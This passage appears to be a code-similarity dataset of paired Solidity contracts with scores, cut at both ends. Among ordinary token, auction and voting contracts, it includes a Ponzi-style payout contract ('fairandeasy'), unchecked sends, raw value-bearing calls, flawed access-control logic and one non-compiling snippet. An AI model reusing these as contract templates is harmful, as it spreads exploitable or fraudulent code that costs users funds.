        allTons[msg.sender].push(Ton({
            id: 2,
            name: ""NotCoolDude"",
            access: false
        }));
    }

    function GiveBytes() public constant returns(bytes){
        

    }


}",0.5926124697796861,"contract TokenInterface is ERC20Interface {

    function symbol() public view returns (string memory);

    function name() public view returns (string memory);

    function decimals() public view returns (uint8);

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success);

}"
"contract Auction {
    address public owner;
    uint public startBlock;
    uint public endBlock;
    string public ipfsHash;

    enum State { Started, Running, Ended, Canceled }
    State public auctionState;

    uint public highestBindingBid;
    address public highestBidder;
    uint bidIncrement;

    mapping(address => uint) public bids;

    constructor() payable public {
        owner = msg.sender;
        auctionState = State.Running;
        startBlock = block.number;
        endBlock = block.number + 40320;
        ipfsHash = """";
        bidIncrement = 10;
    }

    modifier notOwner() {
        require(msg.sender != owner);
        _;
    }

    modifier afterStart() {
        require(block.number >= startBlock);
        _;
    }

    modifier beforeEnd() {
        require(block.number <= endBlock);
        _;
    }

    function min(uint a, uint b) pure internal returns(uint) {
        if(a <= b) {
            return a;
        } else {
            return b;
        }
    }

    function placeBid() payable public notOwner afterStart beforeEnd returns(bool) {
        require(auctionState == State.Running);
        require(msg.value > 0.001 ether);

        uint currentBid = bids[msg.sender] + msg.value;

        require(currentBid > highestBindingBid);

        bids[msg.sender] = currentBid;

        if(currentBid < bids[highestBidder]) {
            highestBindingBid = min(currentBid + bidIncrement, bids[highestBidder]);
        } else {
            highestBindingBid = min(currentBid, bids[highestBidder] + bidIncrement);
            highestBidder = msg.sender;
        }
       return true; 
    }
}",0.5921101329488714,"contract EthBird {
    
    address public owner;
    address highScoreUser;
    
    uint currentHighScore = 0;
    uint contestStartTime = now;
    
    mapping(address => bool) paidUsers;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function EthBird() public {
        owner = msg.sender;
    }
    
    function payEntryFee() public payable  {
        if (msg.value >= 0.001 ether) {
            paidUsers[msg.sender] = true;
        }
    }

    function getCurrentHighscore() public constant returns (uint) {
        return currentHighScore;
    }
    
    function getCurrentHighscoreUser() public constant returns (address) {
        return highScoreUser;
    }
    
    function getCurrentJackpot() public constant returns (uint) {
        return address(this).balance;
    }
    
    function getNextPayoutEstimation() public constant returns (uint) {
        return (contestStartTime + 1 days) - now;
    }
    
    function recordHighScore(uint score, address userToScore)  public onlyOwner returns (address) {
        if(paidUsers[userToScore]){
            if(score > 0 && score >= currentHighScore){
                highScoreUser = userToScore;
                currentHighScore = score;
            }
            if(now >= contestStartTime + 1 days){
                awardHighScore();   
            }
        }
        return userToScore;
    }
    
    function awardHighScore() public onlyOwner {
        uint256 ownerCommision = address(this).balance / 10;
        address(owner).transfer(ownerCommision);
        address(highScoreUser).transfer(address(this).balance);
        contestStartTime = now;
    }
}"
"contract traceitems {

    struct item {
        uint id;
    string name;
        string reason;
    }
 struct Action {
    
    uint timestamp;
    
    uint blockNumber;
  }




    mapping(uint => item) public items;


    uint public itemsCount;


    function additem (string _name,string _reason) private {
        itemsCount ++;
        items[itemsCount] = item(itemsCount,_name, _reason);
    }
  function traceitems () public {
        additem(..,..);

    }



  uint value;
  mapping (uint256 => item) public  datamatching;

function getData(uint256 name) returns (uint, ustring, ustring){
    return (datamatching[].id, datamatching[].name, datamatching[].reason);
  }
------------------------------------------------------------------

    function trackitem (string _name) private {
    action.timestamp = now;
    action.blockNumber = block.number;
    var  itemdata  = datamatching[value];
    items[itemdata] = _reason;
    }




  function storedata (string _reason) public {
    var  artifactdata  = datamatching[value];
    artifactdata .reason = _reason;

  }



}",0.5709709667792183,"contract ERC223 {

  uint public totalSupply;

  function balanceOf(address who) public view returns (uint);

  

  function name() public view returns (string _name);

  function symbol() public view returns (string _symbol);

  function decimals() public view returns (uint8 _decimals);

  function totalSupply() public view returns (uint256 _supply);



  function transfer(address to, uint value) public returns (bool ok);

  function transfer(address to, uint value, bytes data) public returns (bool ok);

  function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok);

  

  event Transfer(address indexed from, address indexed to, uint value, bytes data);

  event Transfer(address indexed from, address indexed to, uint value);

  

    

}"
"contract StoForwarder is Controllable {

    constructor(address _controller, address _controllerAgent) public Controllable(_controller, _controllerAgent) {}

    event NewTask(bytes5 txId, address forwardAddress, address refundAddress, address tokenContract,
        bytes32 partition, uint256 amount);

    struct Task {
        bytes5 txId;
        address forwardAddress;
        address refundAddress;
        IERC1410 tokenContract;
        bytes32 partition;
        uint256 amount;
    }

    mapping (bytes5 => Task) public pendingTasks;

    function callback(IERC1410 _stoContract, bytes32 _partition, uint256 _amount, bytes calldata _data) external {
        require(_data.length >= 46, ""Insufficient data provided"");
        byte operCode;
        bytes5 txId;
        address forwardAddress;
        address refundAddress;
        (operCode, txId, forwardAddress, refundAddress) = abi.decode(_data, (byte, bytes5, address, address));

        require(txId != """", ""TransactionId not specified"");
        require(_partition != """", ""Bad Partition"");
        require(forwardAddress != address(0), ""Bad Forward Address"");
        require(refundAddress != address(0), ""Bad refund Address"");

        pendingTasks[txId].txId = txId;
        pendingTasks[txId].forwardAddress = forwardAddress;
        pendingTasks[txId].refundAddress = refundAddress;
        pendingTasks[txId].tokenContract = _stoContract;
        pendingTasks[txId].partition = _partition;
        pendingTasks[txId].amount = _amount;

        emit NewTask(txId, forwardAddress, refundAddress, address(_stoContract), _partition, _amount);
    }

    function controllerTransfer(bytes5 txId, bool forward) onlyController external {
        require(pendingTasks[txId].txId != """");
        Task storage task = pendingTasks[txId];
        address targetAddress;

        if (forward) {
            targetAddress = task.forwardAddress;
        } else {
            targetAddress = task.refundAddress;
        }

        task.tokenContract.transferByPartition(task.partition, targetAddress, task.amount, """");
    }
}",0.5552611399651823,"contract MWT is ERC1400ERC20 {

  
  bool needWhitelisting = false;

  
  constructor(
      string memory name,
      string memory symbol,
      uint256 granularity,
      address[] memory controllers,
      address certificateSigner,
      bytes32[] memory tokenDefaultPartitions
  )
      public
      ERC1400ERC20(name, symbol, granularity, controllers, certificateSigner, tokenDefaultPartitions)
  {
  }

  
  modifier mayNeedWhitelisting(address sender, address recipient) {
    if (needWhitelisting) {
      require(_whitelisted[sender], ""A5""); 
      require(_whitelisted[recipient], ""A6""); 
    }
    _;
  }

  
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), ""A8""); 
    require(recipient != address(0), ""A8""); 
    require(_defaultPartitions.length != 0, ""A8""); 

    bytes32 perpetualPartition = _defaultPartitions[0];

    require(_balanceOfByPartition[sender][perpetualPartition] >= amount, ""A4""); 

    _removeTokenFromPartition(sender, perpetualPartition, amount);
    _transferWithData(perpetualPartition, sender, sender, recipient, amount, """", """", false);
    _addTokenToPartition(recipient, perpetualPartition, amount);
  }

  
  function setNeedWhitelisting(bool needWhitelist) external onlyOwner {
    needWhitelisting = needWhitelist;
  }

  
  function balanceOf(address tokenHolder) external view returns (uint256) {
    bytes32 perpetualPartition = _defaultPartitions[0];
    return _balanceOfByPartition[tokenHolder][perpetualPartition];
  }

  
  function transfer(address to, uint256 value) external mayNeedWhitelisting(msg.sender, to) returns (bool) {
    _transfer(msg.sender, to, value);
    return true;
  }

  
  function removeMinter(address minter) external onlyOwner {
    _removeMinter(minter);
  }

  
  function addMinter(address account) public onlyOwner {
    _addMinter(account);
  }

  
  function needWhitelist() external view returns (bool) {
    return needWhitelisting;
  }
}"
"contract CollegeAdmin {
    uint8 public studentAge=18;
    uint16 public studentIncome=15000;
    uint8 public studentScore=4;
    uint8 public studentAttendance=96;
    event changedAge(uint age);
    function setAge(uint8 age) public {
        studentAge = age;
        changedAge(age);
    }
}",0.5418634416539138,"contract JcnToken is CappedToken {

	string public name = ""JizzCoins"";
	string public symbol = ""JCN"";
	uint8 public decimals = 18;

	uint256 public constant HARD_CAP = 100000000 * (10 ** uint256(18));			

	
	function JcnToken() public
	CappedToken(HARD_CAP) 
	{	
	}
}"
"contract elections {
    
    
    struct Candidate {
        uint id;
        string name;
        uint voteCount;
    }

    
    mapping(address=>bool) public voters;
    
    mapping(uint=>Candidate) public candidates; 
    

    
    uint public candidatesCount; 

    
    event votedEvent (
        uint indexed _candidateId
    );

    constructor() public {
        
        addCandidates(""Candidate 1"");
        addCandidates(""Candidate 2"");
        addCandidates(""Candidate 3"");
        
    }
    
    function addCandidates(string memory _name) private {
        candidatesCount++; 
        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0); 
    }

    function vote(uint _candidateId) public {
        
        require(!voters[msg.sender]);

        
        require(_candidateId > 0 && _candidateId <= candidatesCount);
        
        voters[msg.sender] = true; 

        
        candidates[_candidateId].voteCount++;

        emit votedEvent(_candidateId);
    }
}",0.5472689645857501,"contract StandardCertificate is owned{
    
    string public name;
    string public description;
    string public language;
    string public place;
    uint public hoursCount;
    
    mapping (address => uint) certificates;
    
    function StandardCertificate (string _name, string _description, string _language, string _place, uint _hoursCount) {
        name = _name;
        description = _description;
        language = _language;
        place = _place;
        hoursCount = _hoursCount;
    }
    
    
    function issue (address student) onlyOwner {
        certificates[student] = now;
    }
    
    function issued (address student)  constant returns (uint) {
        return certificates[student];
    }
    
    function annul (address student) onlyOwner {
        certificates[student] = 0;
    }
    
}"
"contract MyRegistry {

    struct MyEvent {
        string date; 
        string desc; 
        uint count;  
        bool recorded;
    }

    event Record(bytes32 hash, string desc, uint count);

    function record(bytes32 hash, string date, string desc, uint count) external {
        if (registry[hash].recorded)
            throw;
        registry[hash] = MyEvent(date, desc, count, true);
    }

    mapping (bytes32 => MyEvent) public registry;
}",0.5518426977867944,"contract NamedToken {
  string public name;
  string public symbol;
  uint32 public decimals;

  function NamedToken(string _name, string _symbol, uint32 _decimals) {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
  }

  
  function getNameHash() constant returns (bytes32 result){
    return sha3(name);
  }

  
  function getSymbolHash() constant returns (bytes32 result){
    return sha3(symbol);
  }
}"
"contract Test {
    uint public value1;
    uint public value2;

    constructor() public {
        value1 = 1;
        value2 = 2;
    }

    function swapNumberLib() public {
        TestLibrary.swapNumber(value1, value2);
    }

    function swapNumber() public {
        value1 = value2;
    }
}",0.5639517232244403,"contract SaveString{

    constructor() public {

    }

    mapping (uint=>string) data;

    function setStr(uint key, string value) public {

        data[key] = value;

    }

    function getStr(uint key) public constant returns(string){

        return data[key];

    }

}"
"contract TestMikancoin {
  address fox = 0x284A84baA00626e2773a1138D53923b4acAED2F4;

  function testTransfer() public {
    Mikancoin mikan = Mikancoin(DeployedAddresses.Mikancoin());

    uint startingBalance = mikan.balanceOf(msg.sender);

    Assert.equal(mikan.balanceOf(fox), 0, ""Initial fox balance"");

    uint tokens = 5;
    Assert.isTrue(mikan.transfer(fox, tokens), ""Transfer succeeded"");
    Assert.equal(mikan.balanceOf(fox), tokens, ""Fox balance after transfer"");
    Assert.equal(mikan.balanceOf(msg.sender), startingBalance - tokens, ""Sender balance after transfer"");
  }
}",0.5334317856505268,"contract StandardToken is Token {



    function transfer(address _to, uint256 _value) returns (bool success) {

        

        

        

        

        if (balances[msg.sender] >= _value && _value > 0) {

            balances[msg.sender] -= _value;

            balances[_to] += _value;

            emit Transfer(msg.sender, _to, _value);

            return true;

        } else { return false; }

    }





    function balanceOf(address _owner) constant returns (uint256 balance) {

        return balances[_owner];

    }





    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

    uint256 public totalSupply;

}"
"contract Oracle{
    struct DocumentStruct{
        uint value;
    }

    mapping(bytes32 => DocumentStruct) public documentStructs;

    function StoreDocument(bytes32 key, uint value) returns (bool success) {
        documentStructs[key].value = value;
        return true;
    }

}",0.5767590034854136,"contract Example is Upgradeable {
    uint _value;
    
    function initialize() public {
        _sizes[bytes4(keccak256(""getUint()""))] = 32;
    }
    
    function getUint() public view returns (uint) {
        return _value;
    }
    
    function setUint(uint value) public {
        _value = value;
    }
}"
"contract Payment {
    address public counterparty1;
    address public counterparty2;
    uint public margin;
    address public oracleID;


    function Payment(address _cp2, address _oracleID) payable{
        margin = msg.value;
        counterparty1 = msg.sender;
        counterparty2 = _cp2;
        oracleID = _oracleID;
    }


    function Pay(bytes32 _keyval) returns (bool){
        var pValue = RetrieveData(_keyval);
        var npvalue = pValue >= margin ? (this.balance) : pValue;
        if (npvalue > 0 ){
            counterparty2.send(npvalue);
            return true;
        }
        else{
            throw;
        }
    }

    struct DocumentStruct{
        uint value;
    }    
    Oracle oracle;

    function RetrieveData(bytes32 key) 
    public
    constant
    returns(uint) 
    {
        oracle = Oracle(oracleID);
        DocumentStruct memory doc;
        (doc.value) = oracle.documentStructs(key);
        return doc.value;
    }
}",0.5850538366234921,"contract ParisToken is Token {

    uint public totalSupply = 1*10**27;
    uint8 constant public decimals = 18;
    string constant public name = ""ParisToken"";
    string constant public symbol = ""PT"";
    uint constant MAX_UINT = 2**256 - 1;

    function ParisToken() public {
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transferFrom(address _from, address _to, uint _value)
        public
        returns (bool)
    {
        uint allowance = allowed[_from][msg.sender];
        if (balances[_from] >= _value
            && allowance >= _value
            && balances[_to] + _value >= balances[_to]
        ) {
            balances[_to] += _value;
            balances[_from] -= _value;
            if (allowance < MAX_UINT) {
                allowed[_from][msg.sender] -= _value;
            }
            emit Transfer(_from, _to, _value);
            return true;
        } else {
            return false;
        }
    }
}"
"contract FundingTest {

    function testSum() public {
        Funding  f= new Funding();
        Assert.equal(f.sum(1,2),3,"" two plus one should be three"");
    }

    function test_getPatient() public {
        Funding f = new Funding();
        string[] doctorKeys;
        doctorKeys.push(""Doctor1Key"");
        Assert.equal(f.getPatient(1,1),doctorKeys, ""The doctor mapping should be a valid one"");
    }
}",0.5161952460155073,"contract SaveData {
    mapping (uint => string) sign;
    address public owner;
    event SetString(uint key,string types);
    function SaveData() public {
        owner = msg.sender;
    }
    function setstring(uint key,string md5) public returns(string){
        sign[key]=md5;
        return sign[key];
    }

    function getString(uint key) public view returns(string){
        return sign[key];
    }
}"
"contract Escrow {
    uint balance;
    address public manager;
    address public worker;
    address private escrow;
    uint private start;
    bool managerOk;
    bool workerOk;

function Escrow(address manager_address, address worker_address) public {
        manager = manager_address;
        worker = worker_address;
        escrow = msg.sender;
        start = now;
    }

    function accept() public {
        if (msg.sender == manager){
            managerOk = true;
        } else if (msg.sender == worker){
            workerOk = true;
        }
        if (managerOk && workerOk){
            payBalance();
        } else if (managerOk && !workerOk && now > start + 30 days) {
            selfdestruct(manager);
        }
    }

    function payBalance() private {
        escrow.transfer(this.balance / 100);
        if (worker.send(this.balance)) {
            balance = 0;
        } else {
            throw;
        }
    }

    function deposit() public payable {
        if (msg.sender == manager) {
            balance += msg.value;
        }
    }

    function cancel() public {
        if (msg.sender == manager){
            managerOk = false;
        } else if (msg.sender == worker){
            workerOk = false;
        }
        if (!managerOk && !workerOk){
            selfdestruct(manager);
        }
    }

    function kill() public constant {
        if (msg.sender == escrow) {
            selfdestruct(manager);
        }
    }
}",0.5971586322374774,"contract fairandeasy {

  struct Person {
      address etherAddress;
      uint amount;
  }

  Person[] public persons;

  uint public payoutIdx = 0;
  uint public collectedFees;
  uint public balance = 0;

  address public owner;


  modifier onlyowner { if (msg.sender == owner) _ }


  function fairandeasy() {
    owner = msg.sender;
  }

  function() {
    enter();
  }
  
  function enter() {
    if (msg.value < 1/100 ether) {
        msg.sender.send(msg.value);
        return;
    }
	
		uint amount;
		if (msg.value > 50 ether) {
			msg.sender.send(msg.value - 50 ether);	
			amount = 50 ether;
    }
		else {
			amount = msg.value;
		}


    uint idx = persons.length;
    persons.length += 1;
    persons[idx].etherAddress = msg.sender;
    persons[idx].amount = amount;
 
    
   if (idx != 0) {
      collectedFees += 0;
	  owner.send(collectedFees);
	  collectedFees = 0;
      balance += amount;
    } 
    else {
      balance += amount;
    }


    while (balance > persons[payoutIdx].amount / 100 * 150) {
      uint transactionAmount = persons[payoutIdx].amount / 100 * 150;
      persons[payoutIdx].etherAddress.send(transactionAmount);

      balance -= transactionAmount;
      payoutIdx += 1;
    }
  }


  function setOwner(address _owner) onlyowner {
      owner = _owner;
  }
}"
"contract PetSharing {




    
    struct LovePet {
        address lovepet;
        uint lovepetwallet;
    }



    mapping (address => LovePet) LovePeter;

    
    struct Owner {
        address owner;
        string ownerName;
        string petName;
        uint ownerprice;
        string petInfo;
        string petselltext;
        uint ownerwallet;
    }


    mapping (address => Owner) Owners;
    address[] public OwnerAddresses;

    
    struct Image {
        string petImageHash;
        string ipfsInfo;
    }

    mapping (address => Image[]) private images;

    
    struct PetSitter {
        address petsitter;
        string petSittername;
        string petSitterInfo;
        string educationConfirm;
        string petsharetext;
        uint sitterprice;
        uint petsitterwallet;
    }

    mapping (address => PetSitter) PetSitters;
    address[] public PetSitterAddresses;



    
    modifier MasterInfo(address _MASTER) {
        require(_MASTER == msg.sender);
        _;
    }

    
    modifier OwnerModifyInfo(address _OWNER ) {
        require(_OWNER == msg.sender);
        _;

    }

    
    modifier PetSitterModifyInfo(address _PETSITTER) {
        require(_PETSITTER == msg.sender);
        _;

    }

    
    function RegisterMaster(address _master) public {
        LovePeter[_master].lovepet = _master;
    }

    
    function RegisterOwner(address _owner, string _ownername, string _petname, string _petInfo) public  {
         

            Owners[_owner].ownerName = _ownername;
            Owners[_owner].petName = _petname;
            Owners[_owner].petInfo = _petInfo;

            OwnerAddresses.push(_owner);

    }

    
    function RegisterPetsitter(address _petsitter, string _petsittername, string _petsitterinfo, string _education) public  {
     

        PetSitters[_petsitter].petSittername = _petsittername;
        PetSitters[_petsitter].petSitterInfo = _petsitterinfo;
        PetSitters[_petsitter].educationConfirm = _education;

        PetSitterAddresses.push(_petsitter);
    }

    
    function getOwnerAddresses() view public returns (address[]) {
        return OwnerAddresses;
    }

    
    function getOwnerInfo(address _owner) view public returns (string,string,string) {
        return(Owners[_owner].ownerName,Owners[_owner].petName,Owners[_owner].petInfo);
    }

    
    function OwnerCount() view public returns (uint) {
        return OwnerAddresses.length;
    }

    
    function getPetSitterAddresses() view public returns (address[]) {
        return PetSitterAddresses;
    }

    
    function getPetSitterInfo(address _petsitter) view public returns(string,string,string) {
        return (PetSitters[_petsitter].petSittername, PetSitters[_petsitter].petSitterInfo, PetSitters[_petsitter].educationConfirm);
    }

    
    function PetSitterCount() view public returns (uint) {
        return PetSitterAddresses.length;
    }

    
    function uploadImage(string hash, string ipfs) public {
        images[msg.sender].push(Image(hash,ipfs));
    }

    
    function PetSitterShareText(address _PETSITTER, string _petsittertext)  PetSitterModifyInfo(_PETSITTER) public view returns(string) {
      
       _petsittertext  = PetSitters[_PETSITTER].petsharetext;
        return ""정상적으로 등록되었습니다"";
    }

    
    function OwnerShareText(address _OWNER, string _ownersharetext) OwnerModifyInfo(_OWNER) public view  returns(string){
        _ownersharetext = Owners[_OWNER].petselltext;
        return ""정상적으로 등록되었습니다"";
    } 

    
    function TransactionPet(address _petsitter,address _OWNER )  OwnerModifyInfo(_OWNER) public payable {
        require(PetSitters[msg.sender].petsitterwallet >= PetSitters[_petsitter].sitterprice);
        require(PetSitters[_petsitter].sitterprice == msg.value);
    }


    
   function PetChangeTransaction(address _ownerseller, address _PETSITTER, address _MASTER, uint _ownerpirce) MasterInfo(_MASTER) PetSitterModifyInfo(_PETSITTER) public  payable {
       
       _ownerpirce = Owners[_ownerseller].ownerprice;
    
       require(_ownerpirce == msg.value);
       PetSitters[msg.sender].petsitterwallet -= _ownerpirce;
       require(PetSitters[msg.sender].petsitterwallet + _ownerpirce >= PetSitters[msg.sender].petsitterwallet);
       require(LovePeter[_MASTER].lovepetwallet + _ownerpirce >= LovePeter[_MASTER].lovepetwallet);
       LovePeter[_MASTER].lovepetwallet += msg.value;
    }

    function PetChange(address _ownerseller, address _PETSITTER, address _MASTER, uint _ownerpirce) MasterInfo(_MASTER) PetSitterModifyInfo(_PETSITTER) public {
        _ownerpirce = Owners[_ownerseller].ownerprice;
        LovePeter[msg.sender].lovepetwallet -= _ownerpirce;
        require(Owners[_ownerseller].ownerwallet + _ownerpirce >= Owners[_ownerseller].ownerwallet);

       Owners[_ownerseller].ownerwallet += msg.value;
        Owners[_ownerseller].owner = PetSitters[_PETSITTER].petsitter;
    }
     function test(address _OWNER) OwnerModifyInfo(_OWNER) public view  returns(uint){

        return  Owners[_OWNER].ownerwallet;
    }

    function test2(address _MASTER) MasterInfo(_MASTER) public view  returns(uint){

        return LovePeter[_MASTER].lovepetwallet;
    }
}",0.5349882726378519,"contract DELFINIUMToken is ERC20Interface {

	using SafeMath for uint;



	

	string public symbol = 'DELFINIUM';

	string public name = 'DLF';

	uint public decimals = 18;

	address public owner;

	uint public totalSupply = 210000000 * (10 ** 18);

	bool public emergencyFreeze;

	

	

	mapping (address => uint) balances;

	mapping (address => mapping (address => uint) ) allowed;

	mapping (address => bool) frozen;

  



	

	constructor() public {

		owner = msg.sender;

		balances[owner] = totalSupply;

		emit Transfer(address(0x0), msg.sender, totalSupply);

	}



	

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	event Freezed(address targetAddress, bool frozen);

	event EmerygencyFreezed(bool emergencyFreezeStatus);	

  





	

	modifier onlyOwner {

		require(msg.sender == owner, '1');

		_;

	}



	modifier unfreezed(address _account) { 

		require(!frozen[_account], '2');

		_;  

	}

	

	modifier noEmergencyFreeze() { 

		require(!emergencyFreeze, '3');

		_; 

	}

  





	



	

	

	

	function transfer(address _to, uint _value)

		unfreezed(_to) 

		unfreezed(msg.sender) 

		noEmergencyFreeze() 

		public returns (bool success) 

	{

		require(_to != address(0x0), '4');

		require(balances[msg.sender] >= _value, '5');

		balances[msg.sender] = balances[msg.sender].sub(_value);

		balances[_to] = balances[_to].add(_value);

		emit Transfer(msg.sender, _to, _value);

		return true;

	}



	

	

	

	

	function approve(address _spender, uint _value)

		unfreezed(_spender) 

		unfreezed(msg.sender) 

		noEmergencyFreeze() 

		public returns (bool success) 

	{

		allowed[msg.sender][_spender] = _value;

		emit Approval(msg.sender, _spender, _value);

		return true;

	}



	function increaseApproval(address _spender, uint256 _addedValue)

		unfreezed(_spender)

		unfreezed(msg.sender)

		noEmergencyFreeze()

		public returns (bool)

	{

		allowed[msg.sender][_spender] = (

		allowed[msg.sender][_spender].add(_addedValue));

		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

		return true;

	}



	function decreaseApproval (address _spender, uint256 _subtractedValue )

		unfreezed(_spender)

		unfreezed(msg.sender)

		noEmergencyFreeze()

		public returns (bool)

	{

		uint256 oldValue = allowed[msg.sender][_spender];

		if (_subtractedValue > oldValue) {

			allowed[msg.sender][_spender] = 0;

		} else {

			allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);

		}

		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

		return true;

	}



  	

  	

		

  	function approveAndCall(address _spender, uint256 _value, bytes _extraData)

		unfreezed(_spender) 

		unfreezed(msg.sender) 

		noEmergencyFreeze() 

		public returns (bool success) 

	{

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, this, _extraData);

            return true;

        }

    }



	

	

	

	function transferFrom(address _from, address _to, uint _value)

		unfreezed(_to) 

		unfreezed(_from) 

		unfreezed(msg.sender) 

		noEmergencyFreeze() 

		public returns (bool success) 

	{

		require(_value <= allowed[_from][msg.sender], '6');

		require (balances[_from]>= _value, '5');

		balances[_from] = balances[_from].sub(_value);

		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

		balances[_to] = balances[_to].add(_value);

		emit Transfer(_from, _to, _value);

		return true;

	}





	

	

	





	

	

	

	function transferOwnership(address _newOwner)

		onlyOwner

		public 

	{

		require(_newOwner != address(0), '4');

		owner = _newOwner;

		emit OwnershipTransferred(owner, _newOwner);

	}





	

	

	

	function freezeAccount (address _target, bool _freeze) public onlyOwner returns(bool res) {

		require(_target != address(0x0), '4');

		frozen[_target] = _freeze;

		emit Freezed(_target, _freeze);

		return true;

	}



	

	

	

	function emergencyFreezeAllAccounts (bool _freeze) public onlyOwner returns(bool res) {

		emergencyFreeze = _freeze;

		emit EmerygencyFreezed(_freeze);

		return true;

	}

  



	

	

	





	

	

	

	function allowance(address _tokenOwner, address _spender) public view returns (uint remaining) {

		return allowed[_tokenOwner][_spender];

	}



	

	

	

	function balanceOf(address _tokenOwner) public view returns (uint balance) {

		return balances[_tokenOwner];

	}



	

	

	

	function totalSupply() public view returns (uint) {

		return totalSupply;

	}



	

	

	

	function isFreezed(address _targetAddress) public view returns (bool) {

		return frozen[_targetAddress]; 

	}







	

	

	

	function () public payable {

		revert();

	}



	

	

	

	function transferAnyERC20Token(address _tokenAddress, uint _value) public onlyOwner returns (bool success) {

		return ERC20Interface(_tokenAddress).transfer(owner, _value);

	}

}"
"contract Coursetro {

   string fName;
   uint age;
   event Instructor(
       string name,
       uint age
    );

   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
       Instructor(_fName, _age);    
   }

   function getInstructor() view public returns (string, uint) {
       return (fName, age);
   }

}",0.5975785667253813,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract testOnlyBy {
    address master1;
    address master2;

    modifier onlyByMaster1 { if (msg.sender != master1) throw; _ }
    modifier onlyByMaster2 { if (msg.sender != master2) throw; _ }
    modifier onlyByMaster1or2 { if (msg.sender != master1 || msg.sender != master2) throw; _ }

    

    function testOnlyBy(address _master2) {
        master1 = msg.sender;
        master2 = _master2;
    }
    function get() external constant returns(address ret1, address ret2) {
        if (msg.sender == master1 || msg.sender == master2){
             return (master1, master2);
        }
    }
    function getonlyByMaster1() onlyByMaster1 external constant returns(address ret1, address ret2) {
        return (master1, master2);
    }
    function getonlyByMaster2() onlyByMaster2 external constant returns(address ret1, address ret2) {
         return (master1, master2);
    }

    function getonlyByMaster1or2() onlyByMaster1or2 external constant returns(address ret1, address ret2) {
         return (master1, master2);           
    }
}",0.5763571718553385,"contract CreationContract{
    
    address public curator;
    address public dev;

    IToken tokenContract;

  

    function CreationContract(){
        dev = msg.sender;
    }

    function create(address _destination, uint _amount, string _details) returns (uint error){
        if (msg.sender != curator){ return 1; }

        return tokenContract.issueNewCoins(_destination, _amount, _details);
    }

    function setCreationCurator(address _curatorAdress) returns (uint error){
        if (msg.sender != dev){ return 1; }

        curator = _curatorAdress;
        return 0;
    }

    function setTokenContract(address _contractAddress) returns (uint error){
        if (msg.sender != curator){ return 1; }

        tokenContract = IToken(_contractAddress);
        return 0;
    }

    function killContract() returns (uint error) {
        if (msg.sender != dev) { return 1; }

        selfdestruct(dev);
        return 0;
    }

    function tokenAddress() constant returns (address tokenAddress){
        return address(tokenContract);
    } 

    function () {
        throw;
    }
}"
"contract Rental {
    struct PaidRent {
        uint id;
        uint value;
    }
    PaidRent[] public paidrents;
    event RentPaid(bool Status);
    function payRent() public payable returns(bool status) {

        if(owner.send(msg.value)) {
          RentPaid(true);
          return true;
        } else {
          RentPaid(false);
          return false;
        }

    }
}",0.5932376100898181,"contract PayToken is EtherToFARM {
 function() public payable{
         if(msg.sender!=owner)
       giveReward(msg.sender,msg.value);
}

 function giveReward(address _payer,uint _payment) public payable returns (bool _success){
        uint tokenamount = _payment / price;
        return transfer(_payer,tokenamount);
    }     
}"
"contract caller {
    function makeCall(address first, address second){
        first.call.gas(100000).value(200000000000000000)(bytes4(bytes32(sha3('makeCall(address)'))), second);
    }
}",0.5206351195239094,"contract RegistrarFakeInterface {
    
    mapping (address => mapping(bytes32 => address)) public sealedBids;
    
    

    
    function cancelBid(address bidder, bytes32 seal);
}"
"contract MyProjectManger {
  address public owner;
  mapping (uint => MyProject) public myProjects;

  uint projectIndex;
  mapping (uint => uint) public projectFileIndexes;

  struct File {
    string url;
    string fileHash;
  }

  struct MyProject {
    bytes32 id;
    string name;
    mapping (uint => File) projectFiles;
  }

  function MyProjectManger() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function addProject(bytes32 id, string name) public onlyOwner returns(uint projectId) {
    projectId = projectIndex;    
    myProjects[projectIndex] = MyProject(id, name);
    projectIndex++;
  }

  function addProjectFile(string url, string fileHash, uint projectKey) public onlyOwner returns(uint fileId) {
    uint projectFileIndex = projectFileIndexes[projectKey];
    MyProject storage project = myProjects[projectIndex];    
    require(project.id[0] != 0);

    fileId = projectFileIndex;
    project.projectFiles[projectFileIndex] = File(url, fileHash);    
    projectFileIndex++;
  }

  function remove() onlyOwner public {
      selfdestruct(msg.sender);
  }

  
  function() payable public { }

}",0.565921244137466,"contract StrongHandsManager {

    

    event CreateStrongHand(address indexed owner, address indexed strongHand);

    event MintToken(address indexed owner, uint256 indexed amount);

    

    mapping (address => address) public strongHands;

    mapping (address => uint256) public ownerToBalance;

    

    

    string public constant name = ""Stronghands3D"";

    string public constant symbol = ""S3D"";

    uint8 public constant decimals = 18;

    

    uint256 internal tokenSupply = 0;



    function getStrong()

        public

    {

        require(strongHands[msg.sender] == address(0), ""you already became a Stronghand"");

        

        strongHands[msg.sender] = new StrongHand(msg.sender);

        

        emit CreateStrongHand(msg.sender, strongHands[msg.sender]);

    }

    

    function mint(address _owner, uint256 _amount)

        external

    {

        require(strongHands[_owner] == msg.sender);

        

        tokenSupply+= _amount;

        ownerToBalance[_owner]+= _amount;

        

        emit MintToken(_owner, _amount);

    }

    

    

    function totalSupply()

        public

        view

        returns (uint256)

    {

        return tokenSupply;

    }

    

    function balanceOf(address _owner)

        public

        view

        returns (uint256)

    {

        return ownerToBalance[_owner];

    }

}"
"contract Forwarder  {
  
